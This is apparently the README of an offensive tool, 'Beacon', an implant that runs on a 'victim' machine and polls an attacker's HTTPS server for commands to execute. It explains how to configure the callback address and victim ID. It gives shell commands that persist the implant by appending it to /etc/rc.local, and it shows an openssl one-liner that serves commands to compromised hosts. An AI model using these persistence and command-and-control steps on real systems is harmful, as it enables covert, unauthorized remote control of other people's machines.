Beacon
======
Beacon runs in the background on a victim an periodically calls back to an
HTTPS server for a command to execute.

It is meant to be small enough that with minimal amounts of effort it can be
snuck into a startup script (e.g. `/etc/rc.local`) or cron job.

Configuration
-------------
Towards the top of the script are three variables which should be set before
use:
* `CBADDR` sets the address to which to beacon (i.e. the HTTPS server).
* `TGT` is a string that'll be sent to the server to identify the victim
* `WAIT` is how long, in seconds, to wait after a failed beacon

After these three are set accordingly, a program must be chosen to do the
heavy lifting.  Ideally, this takes the form of uncommenting one of the lines
that starts with `C=`.  In practice, these will probably take a little
tweaking.  Feel free to send a pull request if you find something else that
works nicely.

Not every command has been tested.  Those which have are marked as such.

Installation
------------
Once the script is appropriately tweaked, it can be deployed to the target
as-is and run with `nohup`, put on the target somewhere (don't forget to
`chmod 500`) and a line added to a script to fire it off, or the whole thing
less comments and whitespace can be stuck somewhere.

Example
-------
Assuming the tweaked script's on target as /tmp/beacon, it could be persisted
and fired off like this:
```sh
nohup /tmp/beacon &
# Make sure /etc/rc.local doesn't end in exit 0 at this point
echo '(' >> /etc/rc.local
egrep -v '^$|^#' /tmp/beacon >> /etc/rc.local
echo ') & >/dev/null 2>/dev/null' >> /etc/rc.local
```

Comms
-----
Each beacon is one HTTPS request to the server requesting the file specified
in the `TGT` variable.  There is no validation done on the request, so this
could be fairly easily MitM'd.  Please don't use this anywhere that could be a
problem.

Server
------
Any HTTPS server will work.  In the absence of anything better, openssl can be
used, something like:
```sh
echo "malicious command" | openssl s_server
```
In the future, a small HTTPS server will probably be included as part of this
repository.
